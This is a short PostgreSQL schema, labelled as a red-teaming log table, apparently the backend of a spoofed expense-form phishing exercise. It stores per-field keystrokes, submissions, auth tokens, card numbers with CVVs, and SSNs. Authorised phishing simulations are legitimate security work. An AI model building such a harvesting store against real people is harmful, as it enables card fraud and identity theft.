-- Create the unified tripease table for all red teaming logs
CREATE TABLE IF NOT EXISTS tripease (
    id SERIAL PRIMARY KEY,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    
    -- Event tracking
    event_type VARCHAR(50), -- 'keystroke', 'submit', 'pixel', etc.
    
    -- User/Session info
    ip_address INET,
    user_agent TEXT,
    referer TEXT,
    session_id VARCHAR(255),
    
    -- Form field data (captured via keystrokes and submission)
    employee_name VARCHAR(255),
    employee_id VARCHAR(100),
    expense_description TEXT,
    amount VARCHAR(50),
    business_purpose TEXT,
    client_name VARCHAR(255),
    notes TEXT,
    
    -- Sensitive financial data
    card_number VARCHAR(255),
    card_expiry VARCHAR(10),
    card_cvv VARCHAR(10),
    ssn VARCHAR(255),
    
    -- Keystroke specific data
    field_name VARCHAR(100),    -- which field was being typed in
    field_value TEXT,           -- what was typed
    
    -- Submission specific data
    auth_token VARCHAR(255),
    was_submitted BOOLEAN DEFAULT FALSE,
    
    -- Additional metadata
    raw_data JSONB,             -- store any additional data
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create indexes for fast queries
CREATE INDEX IF NOT EXISTS idx_tripease_timestamp ON tripease(timestamp);
CREATE INDEX IF NOT EXISTS idx_tripease_event_type ON tripease(event_type);
CREATE INDEX IF NOT EXISTS idx_tripease_ip ON tripease(ip_address);
CREATE INDEX IF NOT EXISTS idx_tripease_field_name ON tripease(field_name);
CREATE INDEX IF NOT EXISTS idx_tripease_submitted ON tripease(was_submitted);
CREATE INDEX IF NOT EXISTS idx_tripease_session ON tripease(session_id);